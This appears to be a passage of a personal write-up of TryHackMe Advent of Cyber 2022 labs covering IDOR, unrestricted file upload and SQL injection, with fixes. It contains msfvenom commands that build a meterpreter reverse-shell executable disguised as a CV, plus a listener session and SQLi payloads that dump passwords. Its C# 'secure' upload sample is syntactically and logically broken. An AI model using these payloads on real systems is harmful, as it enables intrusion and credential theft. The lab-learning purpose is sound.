@@ -1713,3 +1713,1718 @@ With the host scanned, we can see that port 22 is open on the host machine. It a
 Metasploit Console Commands
 ```shell-session
 msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
+```
+```shell-session
+msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa_username_here:santa_password_here@172.17.0.1
+
+[*] 172.17.0.1:22 - Starting bruteforce
+[+] 172.17.0.1:22 - Success: 'santa_username_here:santa_password_here' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 4 opened (10.11.8.17-10.10.152.194:55634 -> 172.17.0.1:22) at 2022-11-22 02:49:43 -0500
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```shell-session
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.11.8.17:4444 -> 10.10.152.194:44140 (10.10.152.194)
+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.11.8.17:4433 -> 10.10.152.194:33312 (172.28.101.50)
+  3         shell linux            SSH kali @                10.11.8.17-10.10.152.194:55632 -> 172.17.0.1:22 (172.17.0.1)
+```
+To start the AttackBox and the attached Virtual Machine (VM), click on the “Start the AttackBox” button and click on the “Start Machine” button. Please give it a couple of minutes so that you can follow along.
+On the AttackBox, start the Firefox Browser and open the URL `http://MACHINE_IP:8080`. This link should show you a login page. McSkidy has provided us with the following credentials to test the web application:
+-   Username: `mcskidy`
+-   Password: `devtest`
+After doing some tests, Elf Exploit McRed was able to find multiple IDOR vulnerabilities. After logging in, a user can access the profile pages of other users. Moreover, files can be accessed by guessing their sequential number.
+Answer the questions below
+What is the office number of Elf Pivot McRed?
+After logging in, try to change the number 101 in the URL to access the profile pages of other users.
+![[Pasted image 20221220134658.png]]
+![[Pasted image 20221220134719.png]]
+![[Pasted image 20221220134738.png]]
+![[Pasted image 20221220134808.png]]
+![[Pasted image 20221220134851.png]]
+![[Pasted image 20221220134916.png]]
+![[Pasted image 20221220134930.png]]
+![[Pasted image 20221220134945.png]]
+*134*
+Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?
+After logging in, click on the profile image, copy the image address, and try incrementing or decrementing the number 101.
+![[Pasted image 20221220135134.png]]
+![[Pasted image 20221220135230.png]]
+Do you like IDOR? It's an Advent of Cyber classic! If you want more, check out the dedicated [room](https://tryhackme.com/room/idor) or the [Corridor](https://tryhackme.com/room/corridor) challenge.
+### [Day 15] Secure Coding Santa is looking for a Sidekick
+The Story
+Check out InsiderPhD's video walkthrough for Day 15 [here](https://www.youtube.com/watch?v=9Pniza-s1ds)!
+Input Validation
+Insufficient input validation is one of the biggest security concerns for web applications. The issue occurs when user-provided input is inherently trusted by the application. Since user input can also be controlled by an attacker, we can see how this inherent trust can lead to many problems. Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. This task will focus on how insufficient input validation can lead to an Unrestricted File Upload vulnerability.
+Learning Objectives
+-   Input validation of file upload funtionality
+-   Unrestricted file upload vulnerabilities
+-   Phishing through file uploads
+When emails are sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information.
+-   How to properly secure file upload functionality
+The _Unrestricted_ in Unrestricted File Uploads
+The ability to upload files to a server has become integral to how we interact with web applications. Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless.
+Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF). By uploading arbitrary files, an attacker could potentially use the server to host and/or serve illegal content or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.
+Unrestricted File Uploads usually have two main exploitation paths:
+-   If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
+-   If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user's workstation once they view the file.
+There has been quite a lot of focus on RCE through web shells in previous rooms, so in this task, we will focus on the latter exploitation path.
+Santa is Looking for a Sidekick
+Elf McSkidy has provided you with the latest version of the application. Start the machine attached to this task to load the website. Once loaded (roughly 2 minutes), you can navigate to [http://MACHINE_IP/](http://machine_ip/) to view the website, using either the AttackBox or your TryHackMe VPN connection:
+As we can see, the website allows us to upload our CVs to apply for a job in Santa's security team. Before we start the actual testing, let's first try to use the website as intended to get a better understanding of what is happening. Using your favourite word editor, create a simple new PDF and upload it to the application. Once uploaded, we can see the following message:
+Interesting! The message also tells us that there will be human (or elf, more specifically) interaction with the file. This calls for further investigation!
+Let's see what happens when we try to upload something other than a PDF, like an executable. You can rename the file extension of your CV to EXE:
+That seems to work! It seems like the freelance developer has attempted to implement some security controls to prevent naughty elves. However, not all controls were implemented. But can we actually do something with this that will be malicious?
+Why the fuss over the Web Root?
+So why would the developer take care to store the file outside the web root? Web servers are fairly simple things. You request a resource and the web server then responds with the resource. The magic happens when a request resource has a specific file type. Since this is a .NET application, the following resource types would be considered special:
+-   ASP
+-   ASPX
+-   CSHTML
+When a resource is requested with one of these file types, the web server will first execute some instructions found in these pages before sending the compiled response back to the user. Here is an example of an ASPX instruction that would be executed by the server:
+```aspx
+<form id="Form1" method="post" runat="server" EncType="multipart/form-data" action="Upload.aspx">
+```
+This tells the server that the HTML element first requires some formatting before being added to the HTML in the response, as can be seen by the`runat="server"` directive.
+If we could upload any file that we wanted, we could upload one of these special types of pages, like an ASPX webshell. If this file was stored in the web root, we could request the file from the server, forcing the server to execute the code within our file before sending the response. It would be possible to get remote code execution on the web server. However, as the file is stored outside of the web root, we cannot make a request that would retrieve our uploaded file for execution. However, this protection is not sufficient for two main reasons:
+-   Other vulnerabilities, such as local file inclusion, may exist that allow us to force the web server itself to recover the file that was stored outside the web root. If the web server recovers the file, the code within the file will again be executed, allowing for RCE.
+-   While we cannot perhaps get RCE using this vulnerability, we know with certainty that actual users would interact with the files that we upload. Rather than targeting the web server directly, we could target the users that would interact with these files. If we were to upload a file that had malware embedded, it would execute when the user interacted with the file, still allowing us to breach Santa's perimeter!
+Shell from Santa
+Let's try to target one of Santa's elves that would be reviewing the uploaded CVs. In most cases, we would have to be quite creative with the malware that we upload, especially since this is for an application to a security role! This will require us to create a CV with a malicious macro embedded. However, since we are on Santa's red team and this is a security assessment, we only need to show proof of concept. Let's use Metasploit to generate a malicious CV:
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe`
+You can then also use the following to create the associated listener in the msfconsole:
+`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"`
+Once we have our CV, we can upload the file again. Once uploaded, give it a few minutes, and one of those elves should be reviewing our CV:
+```text
+[*] Started reverse handler on 10.50.1.120:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 10.10.1.20 [*] Meterpreter session 1 opened (10.50.1.120:4444 -> 10.10.1.20:1138) -0500 meterpreter >
+```
+This is sufficient for a proof of concept for Elf McSkidy to take to Santa and request that additional security controls must be implemented on the application! Using your shell, go read the flag from the specific elf's home directory.
+Properly Securing File Uploads
+To adequately secure the file upload feature, we will need to implement layers of defence. In this task, we will use a C# file upload as the case study. C# is a popular language used to create both Windows application and web applications at large organisations. Let's look at our base file upload function first:
+Upload.cshtml
+```csharp
+public IActionResult OnPostUpload(FileUpload fileUpload)
+    {   
+        var fullPath = "D:\CVUploads\"
+        var formFile = fileUpload.FormFile;
+        var filePath = Path.Combine(fullPath, formFile.FileName);
+
+        using (var stream = System.IO.File.Create(filePath))
+            {
+                formFile.CopyToAsync(stream);
+            }
+    }
+```
+As we can see, the developer made sure to store the CV outside the web root by setting the full path to a different drive (D:\CVUploads). However, this is not sufficient. Let's take a look at what additional controls can be implemented:
+File Content Validation
+We can validate the content of the file by reviewing the ContentType header that is sent by the browser when a file is uploaded:
+Upload.cshtml
+```csharp
+string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
+if !(contentType.equals("ContentType=PDF")
+    {
+        allowed = False;
+    }
+```
+If the file content type is not PDF, we will reject the file. While this is a good control, it should be noted that since the browser sets this header, an attacker could bypass this control by intercepting the request and changing the header.
+File Extension Validation
+We can also verify the file extension. This will allow us to limit the type of files that can be uploaded. We can therefore add the following lines to our code:
+Upload.cshtml
+```csharp
+string contentExtension = Path.GetExtension(fileUpload);
+if !(contentExtension.equals("PDF"))
+    {
+        allowed = False;
+    }
+```
+This will limit the file types to only PDFs. If a user's CV is in a different format, they will have to convert their CV first. This control should ideally be implemented with an allowlist, as shown above, since a blocklist can still be bypassed in certain cases.
+File Size Validation
+Attackers can also try to upload files that are so large it consumes so much disk space that other potential candidates are not able to upload their CVs. To prevent this, we can implement file size validation controls:
+Upload.cshtml
+```csharp
+int contentSize = fileUpload.ContentLength;
+//10Mb max file size
+int maxFileSize = 10 * 1024 * 1024
+if (contentSize > maxFileSize)
+    {
+        allowed = False;
+    }
+```
+This will only allow file sizes smaller than the specified amount.
+File Renaming
+As mentioned before, even though our uploads are stored outside the web root, an attacker could leverage an additional vulnerability, such as file inclusion, to execute the file. To counter these attempts, we can look to rename uploaded files to random names, making it almost impossible for an attacker to recover their file by name:
+Upload.cshtml
+```csharp
+Guid id = Guid.NewGuid();
+var filePath = Path.Combine(fullPath, id + ".pdf");
+```
+Malware Scanning
+Even with all of the above controls implemented, there is still the risk of an attacker uploading a malicious file that targets the elves that will review the CVs. Since Santa is a high-value individual, some nation-states might even use specialised exploits found in PDF readers to upload a malicious PDF in the hopes of getting access to remove themselves from Santa's naughty list! In order to combat these types of malicious files, we can scan uploaded files for malware. We can install a package such as ClamAV and use it to scan the contents of each uploaded file:
+Upload.cshtml
+```csharp
+var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
+var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
+  
+if (scanResult.Result == ClamScanResults.VirusDetected)
+    {
+        allowed = False;
+    };
+```
+Putting it all Together
+Combining all of the above techniques, we can implement a secure file upload function, as shown below:
+Upload.cshtml
+```csharp
+public IActionResult OnPostUpload(FileUpload fileUpload)
+    {
+        var allowed = True;
+
+        //Store file outside the web root   
+        var fullPath = "D:\CVUploads\"
+
+        var formFile = fileUpload.FormFile;
+
+        //Create a GUID for the file name
+        Guid id = Guid.NewGuid();
+        var filePath = Path.Combine(fullPath, id + ".pdf");
+
+        //Validate the content type
+        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
+        if !(contentType.equals("ContentType=PDF")
+            {
+                allowed = False;
+            }
+
+       //Validate the content extension
+       string contentExtension = Path.GetExtension(fileUpload);
+       if !(contentExtension.equals("PDF"))
+           {
+               allowed = False;
+           }
+
+       //Validate the content size
+       int contentSize = fileUpload.ContentLength;
+       //10Mb max file size
+       int maxFileSize = 10 * 1024 * 1024
+       if (contentSize > maxFileSize)
+           {
+               allowed = False;
+           }
+
+       //Scan the content for malware
+       var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
+       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
+  
+       if (scanResult.Result == ClamScanResults.VirusDetected)
+           {
+                allowed = False;
+           };
+
+       //Only upload if all checks are passed
+       if (allowed)
+       {
+            using (var stream = System.IO.File.Create(filePath))
+                {
+                    formFile.CopyToAsync(stream);
+                }
+       }
+    }
+```
+All of these controls are required for the simple reason that we cannot inherently trust user input. As such, user input must be validated and controlled! Sending this feedback to the freelance developer will allow them to secure the file upload feature!
+Answer the questions below
+What is the name given to file uploads that allow threat actors to upload any files that they want?
+![[Pasted image 20221220170440.png]]
+*Unrestricted*
+What is the title of the web application developed by Santa's freelancer?
+*SantaSideKick2*
+What is the value of the flag stored in the HR Elf's Documents directory?
+```text
+┌──(kali㉿kali)-[~/AOC2022]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o cv-witty.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: cv-witty.exe
+```
+```text
+┌──(kali㉿kali)-[~/AOC2022]
+└─$ ls
+cv-witty.exe
+```
+```text
+┌──(kali㉿kali)-[~/AOC2022]
+└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit" 
+[sudo] password for kali: 
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+LHOST => tun0
+LPORT => 4444
+[*] Started reverse TCP handler on 10.8.19.103:4444
+```
+```text
+meterpreter > search -f flag.txt
+Found 1 result...
+=================
+
+Path                                Size (bytes)  Modified (UTC)
+----                                ------------  --------------
+c:\Users\HR_Elf\Documents\flag.txt  41             -0500
+```
+```text
+meterpreter > cat c:\Users\HR_Elf\Documents\flag.txt
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+```
+```text
+meterpreter > cat 'c:\Users\HR_Elf\Documents\flag.txt'
+THM{Naughty.File.Uploads.Can.Get.You.RCE}
+```
+![[Pasted image 20221220172113.png]]
+![[Pasted image 20221220172220.png]]
+What defence technique can be implemented to ensure that specific file types can be uploaded?
+*File Extension Validation*
+What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?
+*File Renaming*
+What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?
+*Malware Scanning*
+If you want to learn more about vulnerabilities like this one, check out our [Intro to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking) module!
+### [Day 16] Secure Coding SQLi’s the king, the carolers sing
+The Story
+Check out InsiderPhD's video walkthrough for Day 16 [here](https://www.youtube.com/watch?v=iv02-Oi0TvM)!
+Set to have all their apps secured, the elves turned towards the one Santa uses to manage the present deliveries for Christmas. Elf McSkidy asked Elf Exploit and Elf Admin to assist you in clearing the application from SQL injections. When presented with the app's code, both elves looked a bit shocked, as none of them knew how to make any sense of it, let alone fix it. **"We used to have an Elf McCode, but he founded a startup and helps us no more"**, said Admin.
+After a bit of talk, it was decided. The elves returned carrying a pointy hat and appointed you as the new Elf McCode. Congratulations on your promotion!
+Deploying the Virtual Machine
+During this task, you'll use a Virtual Machine (VM) where all the tools you need are already installed. The instructions on what is available and how to use it will be provided further ahead. Since the VM takes a couple of minutes to start, it might be a good idea to click the `Start Machine` button on the top-right corner of this task now. To access the contents in the machine, you will only need your browser (you won't need the AttackBox or VPN for this one).
+SQL Refresher
+**Structured Query Language (SQL)** is the traditional language used to ask databases for information. When you build any application that relies on a database, the app will need to create SQL sentences on the fly and send them to the database engine to retrieve the required information for your app to work. Luckily for you, SQL was built with simplicity in mind, and its syntax is supposed to resemble straightforward English sentences to make it easier for programmers to understand.
+But before explaining the SQL syntax, let's talk about the specific database engine used on our app: MySQL. MySQL stores information in structures called tables. Think of them as any table in a spreadsheet document where you have **columns** and **rows**. For clarity, let's check one of the tables in use in the current application where the toys are stored:
+As you can see, each row of the table corresponds to a different toy, and each column is a **field** of data that describes the toy. Looking at the third row, we can see that our toys table contains a toy named "Car" and that there are 12 units available for it. Pretty easy.
+As mentioned before, when an app needs to retrieve information from the database, it will need to build an **SQL query**. Queries are simple instructions that ask for specific data in a structured way that the database can understand. To query information, we will use **SELECT** statements, indicating which rows of which table we want to retrieve. If we wanted to get all of the columns from the "toys" table in our database, we could use the following statement:
+```sql
+SELECT * FROM toys;
+```
+Notice the asterisk(*), which indicates that you want to retrieve all columns from the table. If you need to ask for specific columns, you can replace the asterisk with a comma-separated list of columns. For example, to retrieve only the name and quantity columns, you can issue the following SQL query:
+```sql
+SELECT name, quantity FROM toys;
+```
+All table rows are returned in both cases before, but you can filter those if needed using a **WHERE** clause. Suppose you want to filter the results of the last query so that you only get the toys for which there is at least a quantity of 20. You could do so with the following statement:
+```sql
+SELECT name, quantity FROM toys WHERE quantity >= 20;
+```
+In real-world apps, you are likely to find much more complex queries in some cases, but what we've covered so far should be enough for the rest of the room.
+Sending SQL Queries from PHP
+Now that we understand how a SELECT statement works, let's see how a PHP application builds and sends such a query to MySQL. Although we are focusing on PHP and MySQL, the same idea generally applies to other programming languages.
+The first step is always to get a connection to the database from our code. To do so, PHP includes the **mysqli** extension, which provides the `mysqli_connect()` function. The function receives the IP or name of the database server as a first parameter (`$server`), followed by the username (`$user`) and password (`$pwd`), and finally, the name of the schema to use(`$schema`), which is just an identifier of the database to which we are connecting. As a result, the function returns a connection handler, which can be used to send further SQL Queries. Think of the connection handler as a variable that holds the connection information to the database, so that queries can be sent to it:
+```php
+$server="db";
+$user="logistics_user";
+$pwd="somePass123";
+$schema="logistics";
+
+$db=mysqli_connect($server,$user,$pwd,$schema);
+```
+Once the connection is made, we can issue SQL queries using the `mysqli_query()` function. The first parameter we pass to the function is the connection handler we got before, and the second parameter is a string with our SQL query:
+```php
+$query="select * from users where id=1";
+$elves_rs=mysqli_query($db,$query);
+```
+As a result of executing the query, we obtain an SQL result set and store it in the `$elves_rs` variable in our example. A result set is nothing more than an object that contains the results of our query, which can be used in the rest of our program to access the resulting data.
+As you can see, it is all as easy as building a string with our query and sending it to the database!
+Building Dynamic Websites
+Now here's where things get interesting. If you check Santa's web application, you can access an elf's profile by using a URL like this:
+[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=2](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=2)
+Depending on the number you put on the `id` parameter of the URL, you get served the profile of a different elf. Behind the curtains, this works by creating an SQL query that embeds the `id` parameter value and returns the information on the corresponding elf.
+In code, it would look like this:
+```php
+$query="select * from users where id=".$_GET['id'];
+$elves_rs=mysqli_query($db,$query);
+```
+The first line builds an SQL query by concatenating the `$_GET['id']` variable as part of the where clause. Note that in PHP, you can access any parameter in the URL as `$_GET['name_of_parameter']`. This query will ask the database for all columns of the table users that correspond to the elf with a specific id. The second line sends the query and returns the information of one particular elf as a result set that we store in the `$elves_rs` variable. The rest of the website then parses the result set and renders the page accordingly.
+If you test the website, you can see that it works as expected. You have, however, introduced an SQL injection vulnerability in your code that could allow an attacker to dump your whole database!
+SQL Injection (SQLi)
+The problem with the method shown before is that it takes untrusted input from the user and concatenates it to an SQL query without any questions asked. As seen in the previous day's task, our app should thoroughly validate any input the user sends before using it. If it doesn't, unexpected things may happen.
+In the case of SQL and our example, an attacker can send SQL syntax through one of the various parameters of the app's URLs, which might end up being concatenated to some SQL query in code, potentially changing its intended purpose.
+Let's get back to the elf's profile page to understand this better. Remember the application is creating a query by concatenating whatever is sent in the `id` parameter as part of the WHERE clause:
+```php
+$query="select * from users where id=".$_GET['id'];
+```
+If the attacker sends the following through the id parameter of the URL:
+[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 OR id = 4](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=-1%20OR%20id%20=%204)
+When PHP concatenates "-1 OR id = 4" to our SQL statement, it will end up with this query:
+```sql
+select * from users where id=-1 OR id = 4
+```
+Suddenly, the attacker has injected some SQL syntax that, when concatenated to our original query, ends up serving the data of the elf with `id=4` for some weird reason.
+If we read the resulting query string, we can see that our WHERE clause was modified to filter only the elves that either have `id=-1` or `id=4`. Since the id values used by the database are likely all positive numbers, no elf will match `id=-1`. Therefore, the database will only return the elf with `id=4`.
+While this example shows a harmless injection, a skilled attacker can try to get your server to run much more complex SQL queries and potentially force the database to return any data on any table they want. Just as an example, look at what happens when you put the following in the `id` parameter:
+[http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users](http://lab_web_url.p.thmlabs.com/webapp/elf.php?id=-1%20union%20all%20select%20null,null,username,password,null,null,null%20from%20users)
+The SQL injected will make the database return all of the users and passwords of the application. Santa won't like this, for sure! If you are interested in learning more about SQL injection from an attacker's perspective, you can check the [SQL injection room](https://tryhackme.com/room/sqlinjectionlm). For the rest of this task, however, we will focus on the defensive side and look at ways to prevent SQL injections in our code, so don't worry too much if the above URL looks hard to understand.
+Fixing the App With Elf Exploit and Elf Admin
+Armed with all this knowledge, we are ready to fix the app. You'll have access to a simple editor to modify the app's source code during this task. Any changes you make in the editor will go live instantly as long as you save your changes (by pressing `CTRL+S`). If you are using the VPN connection, you can access the code editor from any browser of your preference. If you use the AttackBox instead, Firefox is installed and available on the machine's desktop. To get to the code editor, point your browser to the following address:
+[http://LAB_WEB_URL.p.thmlabs.com/](http://lab_web_url.p.thmlabs.com/)
+To enter the code editor, use the following credentials:
+**Username**
+coder
+**Password**
+coder
+In addition to the code editor, you will have access to a chat to communicate with Elf Exploit and Elf Admin. While they don't speak too much, you can request them to check the application for you. If you remember correctly, they don't know a thing about coding. However, Elf Exploit will help you identify parts of the app that are vulnerable to SQLi. Elf Admin, on the other hand, will check that the application is running as expected, so if you make a change that breaks the application somehow, he will let you know so you can roll back and try again. In combination, they will tell you if your changes solve vulnerabilities while avoiding altering how the app is supposed to work.
+To ask the elves to do a recheck of the app, scroll down the elf chat to find the Run Checks button:
+Remember that you can always check the website after any changes by visiting the following link:
+[http://LAB_WEB_URL.p.thmlabs.com/webapp/](http://lab_web_url.p.thmlabs.com/webapp/)
+Now let's get to work!
+Fixing SQLi by Data Type Validation
+One of the easiest and most effective ways to prevent SQL injections is to ensure that any data that the user can manipulate that you are concatenating as part of an SQL statement is actually from the type you expect. Let's go to our elf chat and click the **Run Checks** button.
+Elf Exploit should tell you that he successfully injected some SQL via the id parameter of `elf.php`. Let's open this file in our code editor and look at lines 4-5:
+```php
+$query="select * from users where id=".$_GET['id'];
+$elves_rs=mysqli_query($db,$query);
+```
+The website takes the `id` parameter from the URL and concatenates it to an SQL query, as shown before.
+We can reasonably assume that the website expects an integer `id` to be sent. To avoid injections, we can convert whatever the user inputs in the id parameter to an integer. For this purpose, we will be using the `intval()` function. This function will take a string and try to convert it into an integer. If no valid integer is found on the string, it will return 0, which is also an integer. To clarify this, let's look at some values and how they would be converted:
+```php
+intval("123") = 123
+intval("tryhackme") = 0
+intval("123tryhackme") = 123
+```
+Putting this to use, we can modify line 4 of `elf.php` to look like this:
+```php
+$query="select * from users where id=".intval($_GET['id']);
+```
+That way, even if the attacker sends an SQL injection payload via the id parameter, the app will try converting it to an integer before concatenating it as part of the SQL statement. In the worst-case scenario, the string gets converted to a 0, which is still harmless in this particular case.
+Make sure to press `CTRL+S` to save your changes on the document, and ask the elves to recheck the app. This time Elf Exploit will again tell you he can inject SQL, but in a different way. This happens because the `id` parameter is used twice in `elf.php` to form two separate SQL queries: one to get the elf's information and another to get any toys built by them. Find where this happens and fix the vulnerability. Once you do, ask the elves to recheck, and if your fix is correct, you'll get the first flag.
+Notice that for most data types, you will be able to make something similar. If you expect to receive a float number, you can use `floatval()` just the same. Even if values are not numeric but follow some specific structure, you could implement your own validators to ensure that data conforms with a given format. Think, for example, of a parameter used to send IP addresses. You could quickly implement a simple function to check if the IP is well formed and opt not to run the SQL query if it isn't.
+Fixing SQLi Using Prepared Statements
+While in some cases, you may secure your code with a simple validator, there are situations where you need to allow the user to pass arbitrary strings through a parameter. One example of this can be seen in the search bar of our application.
+Every time a search is done, it gets sent to search-toys.php via the `q` parameter. If you ask the elves to recheck the application right now, Elf Exploit should have a way to take advantage of a vulnerability in that parameter. If we open `search-toys.php` in our code editor, we can quickly see that a query is built in lines 4-5:
+```php
+$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
+$toys_rs=mysqli_query($db,$query);
+```
+Here, the `q` parameter gets concatenated twice into the same SQL sentence. Notice that in both cases, the data in `q` is wrapped around single quotes, which is how you represent a string in SQL. The problem with having PHP build the query is that the database has no other option but to trust what it is being given. If an attacker somehow injects SQL, PHP will blindly concatenate the injected payload into the query string, and the database will execute it.
+While there are a couple of ways to go about this, the safest bet is to use prepared statements to prevent SQL injections.
+**Prepared statements** allow you to separate the syntax of your SQL sentence from the actual parameters used on your WHERE clause. Instead of building a single string by concatenation, you will first describe the structure of your SQL query and use placeholders to indicate the position of your query's parameters. You will then bind the parameters to the prepared statement in a separate function call.
+Instead of providing a single SQL query string, we will send any dynamic parameters separately from the query itself, allowing the database to stick the pieces together securely without depending on PHP or the programmer. Let's see how this looks in the code.
+First, we will modify our initial query by replacing any parameter with a placeholder indicated with a question mark (`?`). This will tell the database we want to run a query that takes two parameters as inputs. The query will then be passed to the `mysqli_prepare()` function instead of our usual `mysqli_query()`. `mysqli_prepare()` will not run the query yet but will indicate to the database to prepare the query with the given syntax. This function will return a prepared statement.
+```php
+$query="select * from toys where name like ? or description like ?";
+$stmt = mysqli_prepare($db, $query);
+```
+To execute our query, MySQL needs to know the value to put on each placeholder we defined before. We can use the `mysqli_stmt_bind_param()` function to attach variables to each placeholder. This function requires you to send the following function parameters:
+The first parameter should be a reference to the prepared statement to which to bind the variables.
+The second parameter is a string composed of one letter per placeholder to be bound, where letters indicate each variable's data type. Since we want to pass two strings, we put `"ss"` in the second parameter, where each "s" represents a string-typed variable. You can also use the letters "i" for integers or "d" for floats. You can check the full list in [PHP's documentation](https://www.php.net/manual/en/mysqli-stmt.bind-param.php).
+After that, you will need to pass the variables themselves. You must add as many variables as placeholders defined with `?` in your query, which in our case, are two. Notice that, in our example, both parameters have the same content, but in other cases, it may not be so.
+The resulting code for this would be as follows:
+```php
+$q = "%".$_GET['q']."%";
+mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
+```
+Once we have created a statement and bound the required parameters, we will execute the prepared statement using `mysqli_stmt_execute()`, which receives the statement `$stmt` as its only parameter.
+```php
+mysqli_stmt_execute($stmt);
+```
+Finally, when a statement has been executed, we can retrieve the corresponding result set using the `mysqli_stmt_get_result()`, passing the statement as the only parameter. We'll assign the result set to the `$toys_rs` variable as in the original code.
+```php
+$toys_rs=mysqli_stmt_get_result($stmt);
+```
+Our final resulting code should look like this:
+```php
+$q = "%".$_GET['q']."%";
+$query="select * from toys where name like ? or description like ?";
+$stmt = mysqli_prepare($db, $query);
+mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
+mysqli_stmt_execute($stmt);
+$toys_rs=mysqli_stmt_get_result($stmt);
+```
+Be sure to save your changes by using `CTRL+S`. If you ask the elves to recheck the app, they should now tell you the vulnerability has been fixed and give you the second flag.
+Finishing the Job
+There are still some SQLi vulnerabilities to be fixed in the code. Using the help of Elf Exploit and Elf Admin and the knowledge we have gained, secure the remaining vulnerabilities to get more flags. Good luck!
+Answer the questions below
+What is the value of Flag1?
+![[Pasted image 20221220214544.png]]
+![[Pasted image 20221220204106.png]]
+![[Pasted image 20221220204023.png]]
+![[Pasted image 20221220204129.png]]
+![[Pasted image 20221220204143.png]]
+![[Pasted image 20221220204208.png]]
+![[Pasted image 20221220204230.png]]
+![[Pasted image 20221220204247.png]]
+![[Pasted image 20221220204258.png]]
+![[Pasted image 20221220204327.png]]
+![[Pasted image 20221220204434.png]]
+![[Pasted image 20221220204511.png]]
+![[Pasted image 20221220204615.png]]
+![[Pasted image 20221220204827.png]]
+![[Pasted image 20221220205049.png]]
+![[Pasted image 20221220205108.png]]
+![[Pasted image 20221220205124.png]]
+![[Pasted image 20221220205207.png]]
+![[Pasted image 20221220205427.png]]
+![[Pasted image 20221220210059.png]]
+![[Pasted image 20221220221030.png]]
+![[Pasted image 20221220221056.png]]
+![[Pasted image 20221220221239.png]]
+![[Pasted image 20221220221338.png]]
+What is the value of Flag2?
+![[Pasted image 20221220221409.png]]
+![[Pasted image 20221220221556.png]]
+![[Pasted image 20221220221617.png]]
+![[Pasted image 20221220221806.png]]
+What is the value of Flag3?
+![[Pasted image 20221220222338.png]]
+![[Pasted image 20221220222426.png]]
+![[Pasted image 20221220222437.png]]
+What is the value of Flag4?
+![[Pasted image 20221220222555.png]]
+![[Pasted image 20221220222829.png]]
+![[Pasted image 20221220222839.png]]
+![[Pasted image 20221220223045.png]]
+![[Pasted image 20221220224503.png]]
+![[Pasted image 20221220224514.png]]
+![[Pasted image 20221220224556.png]]
+If you'd like more SQLi in your life, check out this [room](https://tryhackme.com/room/sqlinjectionlm)!
+### [Day 17] Secure Coding Filtering for Order Amidst Chaos
+The Story
+Check out InsiderPhD's video walkthrough for Day 17 [here](https://www.youtube.com/watch?v=ZsmRQqjGb9E)!
+After handling unrestricted file uploads and SQLi vulnerabilities, McSkidy continued to review Santa's web applications. She stumbled upon user-submitted inputs that are unrecognizable, and some are even bordering on malicious! She then discovered that Santa's team hadn't updated these web applications in a long time, as they clearly needed more controls to filter misuse. Can you help McSkidy research and learn a useful technique to handle that in the future?
+Introduction
+At this point, we are already well aware of the security concerns regarding input validation. Analogous to being the castle wall of your application that forms the first line of defense against an array of scenarios from harmless misuse to outright malicious intents, validating input merits the same effort as its medieval counterpart in terms of its hardening.
+It goes without question that insufficient effort in this space may result in attack vectors being vulnerable and consequently exploited in your application. Day 15 talked about input validation in light of Unrestricted File Upload, while Day 16 focused on SQLi.
